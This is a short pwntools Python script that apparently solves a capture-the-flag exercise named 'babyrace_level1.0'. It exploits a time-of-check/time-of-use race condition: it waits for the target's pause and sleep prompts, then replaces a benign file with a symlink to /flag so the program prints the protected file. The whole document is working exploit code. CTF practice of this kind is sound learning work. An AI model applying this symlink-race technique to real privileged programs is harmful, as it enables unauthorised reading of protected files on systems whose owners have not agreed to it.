from pwn import *
import os
import time

# Set up logging
context.log_level = 'info'

# Create benign file
os.system("echo 'dummy data' > f")

# Path to the flag file - update this to the actual path
flag_path = "/flag"

# Start the process
p = process(["./babyrace_level1.0", "f"])

# Wait for the first pause prompt
p.recvuntil(b"Paused (press enter to continue)")
p.sendline(b"")

# Log the current stage
log.info("First pause passed, preparing for race condition")

# Wait for the sleep notification
p.recvuntil(b"Sleeping for 10000us!")

# Log race condition start
log.info("Race condition window opening, replacing file with symlink")

# This is the critical section - perform the race condition
os.unlink("f")
os.symlink(flag_path, "f")
log.info("File replaced with symlink to flag")

# Wait for the second pause prompt
p.recvuntil(b"Paused (press enter to continue)")
p.sendline(b"")

# Receive the flag
flag = p.recvuntil(b"### Goodbye!").decode()

# Print the flag
log.success(f"Result: {flag}")
p.close()
